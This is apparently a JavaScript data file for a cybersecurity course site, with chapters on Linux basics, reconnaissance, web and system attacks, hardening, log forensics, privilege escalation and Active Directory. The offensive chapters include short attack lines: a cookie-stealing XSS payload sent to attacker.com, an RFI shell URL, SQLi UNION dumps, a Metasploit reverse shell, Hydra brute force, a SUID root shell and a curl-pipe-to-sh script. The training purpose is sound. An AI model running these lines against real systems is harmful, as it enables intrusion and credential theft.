import { Terminal, Shield, Globe, Lock, Code, Database, Server, Network, Cpu, Eye, AlertTriangle, Key, Users, Activity, FileText, Bug, Unlock, Radio, HardDrive, Cpu as Processor } from "lucide-react";

export const docsData = {
	"01-fundamentals": {
		title: "Level 1: Fundamentals",
		icon: Terminal,
		color: "text-green-500",
		chapters: [
			{
				id: "linux-basics-1",
				title: "Linux Essentials: Part 1",
				desc: "The absolute basics of navigating the Linux terminal. Essential for any operator.",
				content: [
					{
						heading: "Navigation & File Management",
						text: "The terminal is your home. Learn to move comfortably.\n- `pwd`: Print Working Directory.\n- `cd`: Change Directory (`cd ..` to go back).\n- `ls`: List files (`ls -la` shows hidden files and permissions).\n- `touch`: Create empty file.\n- `mkdir`: Create directory (`mkdir -p a/b/c` for nested).",
						code: "pwd\n/home/kali\nls -la\ndrwxr-xr-x 2 kali kali 4096 .ssh"
					},
					{
						heading: "Manipulating Files",
						text: "Copy, Move, and Destroy.\n- `cp`: Copy (`cp -r` for folders).\n- `mv`: Move or Rename.\n- `rm`: Remove (`rm -rf` forces deletion of folders - careful!).\n- `cat`: Display file content.\n- `less`: View large files page by page.",
						code: "cp /etc/passwd .\nmv passwd users.txt\ncat users.txt"
					},
					{
						heading: "Piping & Redirection",
						text: "The power of Linux comes from chaining commands.\n- `|` (Pipe): feed output of left to input of right.\n- `>`: Overwrite file.\n- `>>`: Append to file.",
						code: "cat users.txt | grep \"root\" > admins.txt\necho \"New User\" >> users.txt"
					}
				]
			},
			{
				id: "linux-basics-2",
				title: "Linux Essentials: Part 2",
				desc: "Permissions, Users, and Process Management.",
				content: [
					{
						heading: "Permissions (chmod)",
						text: "Linux uses Read (4), Write (2), Execute (1).\n- `rwx` = 7 (4+2+1)\n- `rw-` = 6 (4+2+0)\n- `r-x` = 5 (4+0+1)\nCommon permissions:\n- `777`: Everyone can do everything (Bad security).\n- `755`: Owner can edit, others can only read/execute (Standard for scripts).\n- `600`: Only owner can read/write (Standard for keys/secrets).",
						code: "chmod +x script.sh # Make executable\nchmod 600 id_rsa # Secure SSH key"
					},
					{
						heading: "User Management",
						text: "Who are you? Who owns what?\n- `whoami`: Current user.\n- `id`: Current user ID and groups.\n- `sudo`: Execute as superuser (root).\n- `chown`: Change file owner.",
						code: "sudo chown kali:kali file.txt\nsudo adduser new_operative"
					},
					{
						heading: "Process Control",
						text: "Manage running programs.\n- `ps aux`: List all running processes.\n- `top` / `htop`: Real-time specific resource usage.\n- `kill`: Terminate process by PID.\n- `&`: Run in background.",
						code: "ps aux | grep apache\nkill -9 1337 # Force kill PID 1337"
					}
				]
			},
			{
				id: "text-processing",
				title: "Advanced Text Processing",
				desc: "The cybersecurity superpower: Parsing logs and data streams.",
				content: [
					{
						heading: "Grep (Global Regular Expression Print)",
						text: "Search for patterns in files.\n- `grep -r`: Recursive search.\n- `grep -i`: Case insensitive.\n- `grep -v`: Invert match (exclude).",
						code: "grep -r \"password\" /var/www/html\ncat access.log | grep \"404\""
					},
					{
						heading: "Awk & Cut",
						text: "Extracting columns of data.\n- `cut -d: -f1`: Split by ':' and take 1st field.\n- `awk '{print $1}'`: Print 1st column (space separated).",
						code: "cat /etc/passwd | cut -d: -f1 # List all usernames\nps aux | awk '{print $1, $11}' # User and Command"
					},
					{
						heading: "Sort & Uniq",
						text: "Organizing output.\n- `sort`: Sort lines alphabetically.\n- `uniq -c`: Count unique occurrences (must be sorted first).",
						code: "cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr # Top IPs hitting server"
					}
				]
			},
			{
				id: "networking-basics",
				title: "Networking Fundamentals",
				desc: "Understanding the pipes of the internet.",
				content: [
					{
						heading: "IP Addressing & Subnetting",
						text: "IPv4 addresses are 32-bit numbers. CIDR notation defines the network size.\n- `/24`: 256 IPs (Standard LAN).\n- `/16`: 65,536 IPs.\n- `127.0.0.1`: Localhost (Home loopback).\n- `10.x.x.x`, `192.168.x.x`: Private/Internal IPs.",
						code: "ip addr show\nping -c 4 8.8.8.8"
					},
					{
						heading: "Common Ports & Protocols",
						text: "Memorize these:\n- **21**: FTP (Cleartext file transfer)\n- **22**: SSH (Encrypted remote access)\n- **23**: Telnet (Cleartext remote access - Dangerous!)\n- **53**: DNS (Domain Name System)\n- **80**: HTTP (Web)\n- **443**: HTTPS (Secure Web)\n- **445**: SMB (Windows Shares)\n- **3389**: RDP (Remote Desktop)",
						code: "netstat -tulpn # Show listening ports"
					},
					{
						heading: "Netcat (The Swiss Army Knife)",
						text: "Read and write data across networks.\n- Client: `nc <ip> <port>`\n- Listener: `nc -lvnp <port>`",
						code: "nc -lvnp 4444 # Listen on port 4444\nnc 10.10.10.5 4444 # Connect to listener"
					}
				]
			}
		]
	},
	"02-offensive": {
		title: "Level 2: Offensive Security",
		icon: Shield,
		color: "text-red-500",
		chapters: [
			{
				id: "reconnaissance-mastery",
				title: "Reconnaissance Mastery",
				desc: "Information gathering is 90% of the attack.",
				content: [
					{
						heading: "Nmap: The King of Scanners",
						text: "Network Mapper is essential.\n- `-sC`: Default scripts (safe).\n- `-sV`: Service Version detection (Find outdated app versions).\n- `-p-`: Scan all 65535 ports (standard scan only checks top 1000).\n- `-O`: OS Detection.",
						code: "nmap -sC -sV -oA recon/initial 10.10.10.5\nnmap -p- --min-rate=1000 10.10.10.5"
					},
					{
						heading: "Web Enumeration (Gobuster/Dirb)",
						text: "Brute-forcing hidden directories.\n- Wordlists: `/usr/share/wordlists/dirb/common.txt` is standard.",
						code: "gobuster dir -u http://target.com -w common.txt -x php,txt,html,db"
					},
					{
						heading: "Subdomain Enumeration",
						text: "Finding `dev.target.com` or `admin.target.com`.\n- Tools: `Assetfinder`, `Sublist3r`, `Amass`.",
						code: "assetfinder target.com > subdomains.txt"
					}
				]
			},
			{
				id: "web-exploitation-advanced",
				title: "Web Hacking Deep Dive",
				desc: "Exploiting the OWASP Top 10.",
				content: [
					{
						heading: "SQL Injection (SQLi) Types",
						text: "1. **Error-Based**: Database tells you the error.\n2. **Union-Based**: Combine results with your query.\n3. **Blind**: True/False responses (Time-based or Boolean).",
						code: "' UNION SELECT 1, database(), 3 -- // Find db name\n' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables -- // Dump tables"
					},
					{
						heading: "Cross-Site Scripting (XSS)",
						text: "1. **Reflected**: Payload in URL, executed once.\n2. **Stored**: Payload saved in database (comments, profiles), executes for everyone.\n3. **DOM**: Client-side execution via JS source sinks.",
						code: "<img src=x onerror=alert(1)> // Classic test\n<script>fetch('http://attacker.com/steal?c='+document.cookie)</script> // Cookie theft"
					},
					{
						heading: "File Inclusion (LFI/RFI)",
						text: "Reading server files via parameters.\n- LFI: `page=../../../../etc/passwd`\n- RFI: `page=http://attacker.com/shell.php`",
						code: "curl http://target.com/index.php?page=../../../../etc/passwd"
					}
				]
			},
			{
				id: "system-hacking",
				title: "System Compromise",
				desc: "Getting a shell on the box.",
				content: [
					{
						heading: "Metasploit Framework",
						text: "Modular exploitation.\n- **Exploit**: Code that takes advantage of a flaw.\n- **Payload**: Code that runs *after* exploit (Shell/Meterpreter).\n- **Auxiliary**: Scanners, fuzzers, DoS.",
						code: "msfconsole\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 10.10.14.2\nexploit"
					},
					{
						heading: "Password Cracking",
						text: "Breaking hashes.\n- **John the Ripper**: CPU cracker.\n- **Hashcat**: GPU cracker (Fast).\n- **Hydra**: Online brute-force (SSH/FTP login).",
						code: "john --wordlist=rockyou.txt hashes.txt\nhydra -l admin -P rockyou.txt ssh://10.10.10.5"
					}
				]
			}
		]
	},
	"03-defense": {
		title: "Level 3: Defensive Security",
		icon: Lock,
		color: "text-blue-500",
		chapters: [
			{
				id: "linux-hardening",
				title: "Linux Server Hardening",
				desc: "Locking down the fortress.",
				content: [
					{
						heading: "SSH Configuration",
						text: "Editing `/etc/ssh/sshd_config` is step 1.\n- `PermitRootLogin no`: Never allow root to login directly.\n- `PasswordAuthentication no`: Use SSH keys only.\n- `Port 2222`: Change default port (Security by obscurity, but helps reduce log noise).",
						code: "systemctl restart sshd"
					},
					{
						heading: "Firewalls (UFW/IPTables)",
						text: "Uncomplicated Firewall (UFW) is standard on Ubuntu.",
						code: "ufw allow 80/tcp\nufw allow 443/tcp\nufw allow 2222/tcp\nufw enable"
					},
					{
						heading: "Fail2Ban",
						text: "Automatically ban IPs that fail login too many times.\n- Scans logs for patterns.\n- Updates firewall rules dynamically.",
						code: "apt install fail2ban"
					}
				]
			},
			{
				id: "log-forensics",
				title: "Log Forensics",
				desc: "Tracking the intruder.",
				content: [
					{
						heading: "Analyzing Auth Logs",
						text: "Who tried to login? `/var/log/auth.log`.",
						code: "grep \"Failed\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr"
					},
					{
						heading: "Apache/Nginx Logs",
						text: "Web attacks leave traces in `/var/log/apache2/access.log`.\n- Look for User-Agents like `sqlmap` or `nikto`.\n- Look for encoded strings `%27` (') or `%3C` (<).",
						code: "grep \"sqlmap\" access.log\ngrep \"UNION\" access.log"
					}
				]
			}
		]
	},
	"04-advanced": {
		title: "Level 4: Advanced Concepts",
		icon: Cpu,
		color: "text-purple-500",
		chapters: [
			{
				id: "privilege-escalation-mastery",
				title: "Privilege Escalation Mastery",
				desc: "From User to Root/SYSTEM.",
				content: [
					{
						heading: "SUID Binaries (Linux)",
						text: "Executables that run with owner permissions (often root).\n- If a binary like `find` or `vim` has SUID, you can spawn a root shell.",
						code: "find / -perm -u=s -type f 2>/dev/null\n# If vim has SUID:\nvim -c ':!/bin/sh'"
					},
					{
						heading: "Kernel Exploits (Dirty Cow / PwnKit)",
						text: "Exploiting OS bugs to gain root. Last resort (can crash system).\n- Compile exploit code on victim machine.",
						code: "gcc dirtycow.c -o cow\n./cow"
					},
					{
						heading: "WinPEAS & LinPEAS",
						text: "Automated enumeration scripts that search for all common privesc vectors.",
						code: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
					}
				]
			},
			{
				id: "reverse-engineering-basics",
				title: "Reverse Engineering Basics",
				desc: "Understanding compiled code.",
				content: [
					{
						heading: "Static Analysis",
						text: "Reading the binary without running it.\n- `file`: Determine type.\n- `strings`: Extract printable characters (find hardcoded passwords!).\n- `objdump`: Disassemble code.",
						code: "strings malware.exe | grep \"pass\""
					},
					{
						heading: "Buffer Overflows",
						text: "The classic memory corruption.\n1. Fuzzing: Send massive data to crash program.\n2. Offset: Find exactly where memory breaks.\n3. Overwrite EIP: Control execution pointer.\n4. Shellcode: Inject payload.",
						code: "python -c 'print \"A\"*1000'"
					}
				]
			},
			{
				id: "active-directory-attacks",
				title: "Active Directory Attacks",
				desc: "Enterprise Domination.",
				content: [
					{
						heading: "LLMNR Poisoning (Responder)",
						text: "Capturing Windows hashes on the network when a user mistypes a share name.",
						code: "responder -I eth0 -dwv"
					},
					{
						heading: "Kerberoasting",
						text: "Requesting Service Tickets (TGS) for accounts with SPNs, then cracking quickly offline.",
						code: "GetUserSPNs.py domain.local/user:password -request"
					},
					{
						heading: "BloodHound",
						text: "Visualizing the hidden relationships in an AD environment to find the shortest path to Domain Admin.",
						code: "neo4j start\nbloodhound"
					}
				]
			}
		]
	}
};
